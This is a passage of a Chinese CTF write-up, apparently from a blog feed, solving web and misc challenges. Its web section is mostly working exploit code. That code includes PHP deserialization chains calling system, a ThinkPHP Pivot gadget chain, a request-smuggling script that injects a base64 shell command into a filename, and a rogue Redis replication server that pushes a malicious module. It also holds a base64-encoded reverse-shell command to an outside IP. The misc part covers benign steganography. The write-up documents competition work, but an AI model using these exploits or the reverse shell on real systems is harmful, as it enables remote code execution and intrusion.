class="hljs-class"></span>&#123;<br>&#125;<br><span class="hljs-variable">$someclass</span> = <span class="hljs-keyword">new</span> SomeClass();<br><span class="hljs-variable">$e</span> = <span class="hljs-keyword">new</span> E();<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> B();<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> A();<br><span class="hljs-variable">$f</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ArrayObject</span>();<br><span class="hljs-variable">$e</span>-&gt;a = <span class="hljs-variable">$b</span>;<br><span class="hljs-variable">$b</span>-&gt;a=<span class="hljs-variable">$a</span>;<br><span class="hljs-variable">$a</span>-&gt;b = <span class="hljs-variable">$f</span>;<br><span class="hljs-variable">$f</span>-&gt;a = <span class="hljs-string">&quot;system&quot;</span>;<br><span class="hljs-variable">$f</span>-&gt;b = <span class="hljs-string">&quot;cat /nssctfflag&quot;</span>;<br><span class="hljs-variable">$res</span> = <span class="hljs-keyword">array</span>(<span class="hljs-variable">$someclass</span>,<span class="hljs-variable">$e</span>);<br><span class="hljs-variable">$payload</span> = <span class="hljs-string">&#x27;a:1:&#123;i:1;O:22:&quot;__PHP_Incomplete_Class&quot;:1:&#123;s:2:&quot;aa&quot;;&#x27;</span>.serialize(<span class="hljs-variable">$res</span>).<span class="hljs-string">&#x27;&#125;&#125;&#125;&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$payload</span>;<br></code></pre></div></td></tr></table></figure><p>第二种方法</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SomeClass</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>&#125;<br><br><span class="hljs-variable">$e</span> = <span class="hljs-keyword">new</span> E();<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> A();<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> B();<br><br><span class="hljs-variable">$e</span>-&gt;a = <span class="hljs-variable">$b</span>;<br><span class="hljs-variable">$b</span>-&gt;a = <span class="hljs-variable">$a</span>;<br><span class="hljs-variable">$arr</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ArrayObject</span>();<span class="hljs-comment">//换其他原生类都行error啥的都可以</span><br><span class="hljs-variable">$arr</span>-&gt;a = <span class="hljs-string">&quot;system&quot;</span>;<br><span class="hljs-variable">$arr</span>-&gt;b = <span class="hljs-string">&quot;cat /nssctfflag&quot;</span>;<br><span class="hljs-variable">$a</span>-&gt;b = <span class="hljs-variable">$arr</span>;<br><span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> SomeClass();<br><span class="hljs-variable">$c</span>-&gt;a = <span class="hljs-variable">$e</span>;<br><span class="hljs-keyword">echo</span> str_replace(<span class="hljs-string">&quot;i:1;&quot;</span>, <span class="hljs-string">&quot;i:0;&quot;</span>, serialize(<span class="hljs-keyword">array</span>(<span class="hljs-variable">$c</span>,<span class="hljs-number">1</span>)));<br><br></code></pre></div></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/a040b6b84ad34fa4ba8347f19ddf4a40.png" alt="在这里插入图片描述"></p><h3 id="Ezpop"><a href="#Ezpop" class="headerlink" title="Ezpop"></a>Ezpop</h3><p><code>/s=Index/test</code>直接打即可</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">think</span>&#123;<br>    <span class="hljs-title">abstract</span> <span class="hljs-title">class</span> <span class="hljs-title">Model</span>&#123;<br>        <span class="hljs-title">private</span> $<span class="hljs-title">lazySave</span> = <span class="hljs-title">false</span>;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$data</span> = [];<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$exists</span> = <span class="hljs-literal">false</span>;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$table</span>;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$withAttr</span> = [];<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$json</span> = [];<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$jsonAssoc</span> = <span class="hljs-literal">false</span>;<br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$obj</span> = <span class="hljs-string">&#x27;&#x27;</span></span>)</span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;lazySave = <span class="hljs-literal">True</span>;<br>            <span class="hljs-keyword">$this</span>-&gt;data = [<span class="hljs-string">&#x27;whoami&#x27;</span> =&gt; [<span class="hljs-string">&#x27;cat /flag.txt&#x27;</span>]];<br>            <span class="hljs-keyword">$this</span>-&gt;exists = <span class="hljs-literal">True</span>;<br>            <span class="hljs-keyword">$this</span>-&gt;table = <span class="hljs-variable">$obj</span>;<br>            <span class="hljs-keyword">$this</span>-&gt;withAttr = [<span class="hljs-string">&#x27;whoami&#x27;</span> =&gt; [<span class="hljs-string">&#x27;system&#x27;</span>]];<br>            <span class="hljs-keyword">$this</span>-&gt;json = [<span class="hljs-string">&#x27;whoami&#x27;</span>,[<span class="hljs-string">&#x27;whoami&#x27;</span>]];<br>            <span class="hljs-keyword">$this</span>-&gt;jsonAssoc = <span class="hljs-literal">True</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">namespace</span> <span class="hljs-title">think</span>\<span class="hljs-title">model</span>&#123;<br>    <span class="hljs-title">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">Model</span>;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Pivot</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Model</span></span>&#123;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span>&#123;<br>    <span class="hljs-title">echo</span>(<span class="hljs-title">urlencode</span>(<span class="hljs-title">serialize</span>(<span class="hljs-title">new</span> <span class="hljs-title">think</span>\<span class="hljs-title">model</span>\<span class="hljs-title">Pivot</span>(<span class="hljs-title">new</span> <span class="hljs-title">think</span>\<span class="hljs-title">model</span>\<span class="hljs-title">Pivot</span>()))));<br>&#125;<br><br></code></pre></div></td></tr></table></figure><h3 id="online-crt"><a href="#online-crt" class="headerlink" title="online_crt"></a>online_crt</h3><p>url编码可以得到rawpath，host改成admin。然后向文件名内注入命令。</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests <br><br>s= requests.session()<br><br>url = <span class="hljs-string">&quot;http://eci-2zebelhabwvwlf4wdymv.cloudeci1.ichunqiu.com:8888&quot;</span><br><br>path = s.post(url+<span class="hljs-string">&#x27;/getcrt&#x27;</span>,data=&#123;<br>    <span class="hljs-string">&quot;Country&quot;</span>: <span class="hljs-string">&quot;CN&quot;</span>,<br>    <span class="hljs-string">&quot;Province&quot;</span>: <span class="hljs-string">&quot;a&quot;</span>,<br>    <span class="hljs-string">&quot;City&quot;</span>: <span class="hljs-string">&quot;a&quot;</span>,<br>    <span class="hljs-string">&quot;OrganizationalName&quot;</span>: <span class="hljs-string">&quot;a&quot;</span>,<br>    <span class="hljs-string">&quot;CommonName&quot;</span>: <span class="hljs-string">&quot;a&quot;</span>,<br>    <span class="hljs-string">&quot;EmailAddress&quot;</span>: <span class="hljs-string">&quot;aaa@aa.com&quot;</span><br>&#125;)<br><span class="hljs-comment"># &quot;|echo &quot;Y2F0IC9mbGFn&quot; |base64 -d|bash;&quot;ss.crt</span><br><span class="hljs-built_in">print</span>(path.text)<br>res = requests.request(<span class="hljs-string">&#x27;get&#x27;</span>,url+<span class="hljs-string">&#x27;/proxy&#x27;</span>,data=&#123;<br>    <span class="hljs-string">&quot;uri&quot;</span>:<span class="hljs-string">&quot;&quot;&quot;/admin%2frename?oldname=57c0d192-d1a6-4807-b90e-fabbc8665a75.crt&amp;newname=%22%7c%65%63%68%6f%20%22%59%32%46%30%49%43%39%6d%62%47%46%6e%22%20%7c%62%61%73%65%36%34%20%2d%64%7c%62%61%73%68%3b%22%73%73%2e%63%72%74 HTTP/1.1\r</span><br><span class="hljs-string">Host: admin\r</span><br><span class="hljs-string">Origin: \r</span><br><span class="hljs-string">User-Agent: Guest\r</span><br><span class="hljs-string">Accept-Encoding: gzip, deflate\r</span><br><span class="hljs-string">Accept-Language: zh-CN,zh;q=0.9\r</span><br><span class="hljs-string">Connection: close\r</span><br><span class="hljs-string">\r</span><br><span class="hljs-string">\r</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>&#125;)<br><span class="hljs-built_in">print</span>(res.request.body)<br><span class="hljs-built_in">print</span>(res.text)<br></code></pre></div></td></tr></table></figure><h3 id="cmdbrowser"><a href="#cmdbrowser" class="headerlink" title="cmdbrowser"></a>cmdbrowser</h3><p>用<code>telnet://127.0.0.1:6379</code>可直接连接到本地redis，之后打主从复制就行了。不过后面存在<code>/readflag</code>计算器读flag限制，需要弹shell交互，弹shell卡了半年。。。<br><img src="https://img-blog.csdnimg.cn/13de058c248f44f59a04448d86775948.png" alt="在这里插入图片描述"><br>恶意redis服务脚本</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/local/bin python</span><br><span class="hljs-comment">#coding=utf8</span><br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> time<br><br>CRLF=<span class="hljs-string">&quot;\r\n&quot;</span><br>payload=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;exp.so&quot;</span>,<span class="hljs-string">&quot;rb&quot;</span>).read()<br>exp_filename=<span class="hljs-string">&quot;exp.so&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">redis_format</span>(<span class="hljs-params">arr</span>):</span><br>    <span class="hljs-keyword">global</span> CRLF<br>    <span class="hljs-keyword">global</span> payload<br>    redis_arr=arr.split(<span class="hljs-string">&quot; &quot;</span>)<br>    cmd=<span class="hljs-string">&quot;&quot;</span><br>    cmd+=<span class="hljs-string">&quot;*&quot;</span>+<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(redis_arr))<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> redis_arr:<br>        cmd+=CRLF+<span class="hljs-string">&quot;$&quot;</span>+<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(x))+CRLF+x<br>    cmd+=CRLF<br>    <span class="hljs-keyword">return</span> cmd<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">redis_connect</span>(<span class="hljs-params">rhost,rport</span>):</span><br>    sock=socket.socket()<br>    sock.connect((rhost,rport))<br>    <span class="hljs-keyword">return</span> sock<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">send</span>(<span class="hljs-params">sock,cmd</span>):</span><br>    sock.send(redis_format(cmd))<br>    <span class="hljs-built_in">print</span>(sock.recv(<span class="hljs-number">1024</span>).decode(<span class="hljs-string">&quot;utf-8&quot;</span>))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">RogueServer</span>(<span class="hljs-params">lport</span>):</span><br>    <span class="hljs-keyword">global</span> CRLF<br>    <span class="hljs-keyword">global</span> payload<br>    flag=<span class="hljs-literal">True</span><br>    result=<span class="hljs-string">&quot;&quot;</span><br>    sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>    sock.bind((<span class="hljs-string">&quot;0.0.0.0&quot;</span>,lport))<br>    sock.listen(<span class="hljs-number">10</span>)<br>    clientSock, address = sock.accept()<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\033[92m[+]\033[0m Accepted connection from &#123;&#125;:&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(address[<span class="hljs-number">0</span>], address[<span class="hljs-number">1</span>]))<br><br>    <span class="hljs-keyword">while</span> flag:<br>        data = clientSock.recv(<span class="hljs-number">1024</span>)<br>        <span class="hljs-built_in">print</span>(data)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;PING&quot;</span> <span class="hljs-keyword">in</span> data.decode():<br>            result=<span class="hljs-string">&quot;+PONG&quot;</span>+CRLF<br>            clientSock.send(result)<br>            flag=<span class="hljs-literal">True</span><br>            <span class="hljs-built_in">print</span>(result)<br>        <span class="hljs-keyword">elif</span> <span class="hljs-string">&quot;REPLCONF&quot;</span> <span class="hljs-keyword">in</span> data:<br>            result=<span class="hljs-string">&quot;+OK&quot;</span>+CRLF<br>            clientSock.send(result)<br>            flag=<span class="hljs-literal">True</span><br>            <span class="hljs-built_in">print</span>(result)<br>        <span class="hljs-keyword">elif</span> <span class="hljs-string">&quot;PSYNC&quot;</span> <span class="hljs-keyword">in</span> data <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;SYNC&quot;</span> <span class="hljs-keyword">in</span> data:<br>            result = <span class="hljs-string">&quot;+FULLRESYNC &quot;</span> + <span class="hljs-string">&quot;a&quot;</span> * <span class="hljs-number">40</span> + <span class="hljs-string">&quot; 1&quot;</span> + CRLF<br>            result += <span class="hljs-string">&quot;$&quot;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(payload)) + CRLF<br>            result = result.encode()<br>            result += payload<br>            result += CRLF<br>            clientSock.send(result)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\033[92m[+]\033[0m FULLRESYNC ...&quot;</span>)<br>            flag=<span class="hljs-literal">False</span><br>            <span class="hljs-comment">#print(result)</span><br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\033[92m[+]\033[0m It&#x27;s done&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&quot;__main__&quot;</span>:<br><br>    lport=<span class="hljs-number">2333</span><br>    RogueServer(lport)<br></code></pre></div></td></tr></table></figure><p>记录一下redis弹shell命令。其实很简单就base一下。</p><figure class="highlight coq"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs coq">system.exec &#x27;echo <span class="hljs-string">&quot;YmFzaCAtaSA+JiAvZGV2L3RjcC8zOS4xMDcuMjM5LjMwLzEyMzQ1IDA+JjE=&quot;</span>|<span class="hljs-type">base64</span> -d |<span class="hljs-type">bash</span> -i&#x27;<br></code></pre></div></td></tr></table></figure><p>最后<code>trap &quot;&quot; 14</code>即可让<code>/readflag</code>停住<br><img src="https://img-blog.csdnimg.cn/997e1f380bed45a99e05f0c1db24e3b2.png" alt="在这里插入图片描述"></p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="everlasting-night"><a href="#everlasting-night" class="headerlink" title="everlasting_night"></a>everlasting_night</h3><p>首先是 通过alpha通道发现可疑字符串 利用 带密钥lsb脚本解密 得到另一个带密码的png。<br>然后原图末尾有16字节32个字符，通过somd5反查得到字符串 为 带密钥lsb解出的zip密码<br>然后png无法打开，通过暴力枚举的方式进行查看<br>虽然是PNG但事实BMP 的文件结构</p><figure class="highlight python-repl"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python-repl">from PIL import Image<br>col=&quot;&quot;<br>img = Image.new(&quot;RGB&quot;,(1000,1000))<br>for i in range(0,len(col),6):<br>    color = (int(col[i+2:i+4],16),int(col[i:i+2],16),int(col[i+4:i+6],16))<br>    img.putpixel((((i//6)%704),(i//6)//704),color)<br>img.show()<br><br></code></pre></div></td></tr></table></figure><p><img src="https://md.buptmerak.cn/uploads/upload_da0bb5d33ea7cc39bb96ed6cc65a6df4.png"></p><h3 id="babydisk"><a href="#babydisk" class="headerlink" title="babydisk"></a>babydisk</h3><p>取证大师恢复文件得到一个 音频wav一个 SECRET 被TRUECRYPT加密过，测试发现 wav被deepsound加密了。用deepsound2john爆破得到密码feedback，解密得到Truecrypt 密码。继续利用取证大师挂在TRUECRYPT加密文件得到serial.zip，搜索发现螺旋<br>利用网上脚本写个反向得出来。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">space</span><span class="hljs-params">(<span class="hljs-keyword">int</span>, <span class="hljs-keyword">int</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> matrix[<span class="hljs-number">101</span>][<span class="hljs-number">101</span>];<br>    <span class="hljs-keyword">int</span> m;<br>    <span class="hljs-keyword">int</span> n;<br>    <span class="hljs-keyword">int</span> i, j;<br>    <span class="hljs-comment">// 输入m*n的矩阵</span><br>m=<span class="hljs-number">87</span>,n=<span class="hljs-number">87</span>;<br>freopen(<span class="hljs-string">&quot;result.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>,<span class="hljs-built_in">stdin</span>);<br>freopen(<span class="hljs-string">&quot;final.txt&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>,<span class="hljs-built_in">stdout</span>); <br>    <span class="hljs-comment">//定义上下左右边界，每次边上的数后，更新周围的值</span><br>    <span class="hljs-keyword">int</span> up = <span class="hljs-number">0</span>, left = <span class="hljs-number">0</span>, down = m<span class="hljs-number">-1</span>, right = n<span class="hljs-number">-1</span>;<br>    <span class="hljs-keyword">int</span> k, num = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (up &lt;= down &amp;&amp; left &lt;= right) &#123;<br>        <span class="hljs-comment">// 向右输出</span><br>        <span class="hljs-keyword">for</span> (k = left; k &lt;= right; k++) &#123;<br>            <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;matrix[up][k]);<br>            num++;<br>            space(num, m*n);<br>        &#125;<br>        up++;<br>        <span class="hljs-keyword">if</span> (num == m*n)  <span class="hljs-comment">//如果全部数值已经输出完毕，退出while循环</span><br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-comment">// 向下输出</span><br>        <span class="hljs-keyword">for</span> (k = up; k &lt;= down; k++) &#123;<br>            <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;matrix[k][right]);<br>            num++;<br>            space(num, m*n);<br>        &#125;<br>        right--;<br>        <span class="hljs-keyword">if</span> (num == m*n)  <span class="hljs-comment">//如果全部数值已经输出完毕，退出while循环</span><br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-comment">// 向左输出</span><br>        <span class="hljs-keyword">for</span> (k = right ; k &gt;= left; k--) &#123;<br>            <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;matrix[down][k]);<br>            num++;<br>            space(num, m*n);<br>        &#125;<br>        down--;<br>        <span class="hljs-keyword">if</span> (num == m*n)  <span class="hljs-comment">//如果全部数值已经输出完毕，退出while循环</span><br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-comment">// 向上输出</span><br>        <span class="hljs-keyword">for</span> (k = down; k &gt;= up; k--) &#123;<br>            <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;matrix[k][left]);<br>            num++;<br>            space(num, m*n);<br>        &#125;<br>        left++;<br>        <span class="hljs-keyword">if</span> (num == m*n)  <span class="hljs-comment">//如果全部数值已经输出完毕，退出while循环</span><br>            <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;m;i++)<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> j=<span class="hljs-number">0</span>;j&lt;n;j++)&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>,matrix[i][j]);<br>&#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//判断每次输出数字后是否要输出空格</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">space</span><span class="hljs-params">(<span class="hljs-keyword">int</span> num,<span class="hljs-keyword">int</span> all)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (num &lt; all)<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; &quot;</span>);<br>&#125;<br><br></code></pre></div></td></tr></table></figure><figure class="highlight vim"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs vim"><span class="hljs-string">&quot;&quot;</span><span class="hljs-comment">&quot;files=open(&#x27;spiral.zip&#x27;,&#x27;rb&#x27;)</span><br>data=<span class="hljs-keyword">open</span>(<span class="hljs-string">&#x27;result.txt&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>)<br><span class="hljs-keyword">for</span> i in <span class="hljs-keyword">files</span>.<span class="hljs-keyword">read</span>():<br>    data.<span class="hljs-keyword">write</span>(str(i)+<span class="hljs-string">&#x27; &#x27;</span>)<span class="hljs-string">&quot;&quot;</span><span class="hljs-comment">&quot;</span><br><span class="hljs-keyword">res</span>=<span class="hljs-keyword">open</span>(<span class="hljs-string">&#x27;final.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>).<span class="hljs-keyword">read</span>()<br>ok=<span class="hljs-keyword">res</span>.<span class="hljs-keyword">split</span>()<br><span class="hljs-keyword">print</span>(<span class="hljs-built_in">len</span>(ok))<br>from Crypto.Util.<span class="hljs-keyword">number</span> import *<br>flag=<span class="hljs-keyword">open</span>(<span class="hljs-string">&quot;flag.zip&quot;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>)<br><span class="hljs-keyword">for</span> i in ok:<br>    flag.<span class="hljs-keyword">write</span>(long_to_bytes(<span class="hljs-keyword">int</span>(i)))<br></code></pre></div></td></tr></table></figure><p>拿到图片之后手动解个螺旋。得到flag。</p><h3 id="ez-usb"><a href="#ez-usb" class="headerlink" title="ez_usb"></a>ez_usb</h3><p>流量提取2.8.1和2.10.1两个设备得键盘。<br>一个是rar密码，一个是加密rar。<br>用网上常见脚本即可。</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>鹏城杯初赛</title>
    <link href="/2022/07/24/2022-7-24-%E7%AC%AC%E4%BA%8C%E5%B1%8A%E2%80%9C%E9%B9%8F%E5%9F%8E%E6%9D%AF%E2%80%9D%20%E5%88%9D%E8%B5%9B/"/>
    <url>/2022/07/24/2022-7-24-%E7%AC%AC%E4%BA%8C%E5%B1%8A%E2%80%9C%E9%B9%8F%E5%9F%8E%E6%9D%AF%E2%80%9D%20%E5%88%9D%E8%B5%9B/</url>
    
